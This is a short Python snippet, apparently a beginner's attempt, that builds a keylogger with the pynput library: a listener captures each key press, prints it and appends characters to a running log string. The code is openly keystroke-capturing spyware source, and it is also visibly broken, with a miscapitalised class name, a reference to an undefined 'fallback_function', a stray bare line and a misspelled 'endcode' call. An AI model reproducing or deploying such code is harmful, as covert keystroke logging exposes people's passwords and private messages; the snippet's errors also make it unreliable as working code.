import pynput.keyboard

Keylogger_listener = pynput.Keyboard.Listener (on_press=fallback_function)
def callback_function (key):
    print(key)
Keylogger_listener
Keylogger_listener = pynput.Keyboard.Listener(on_press=callback_function)
with Keylogger_listener:
    Keylogger_listener.join()


log = ""
def callback_function(key):
    global log
    log =  log + key.char.endcode ("utf-8")
    print(log)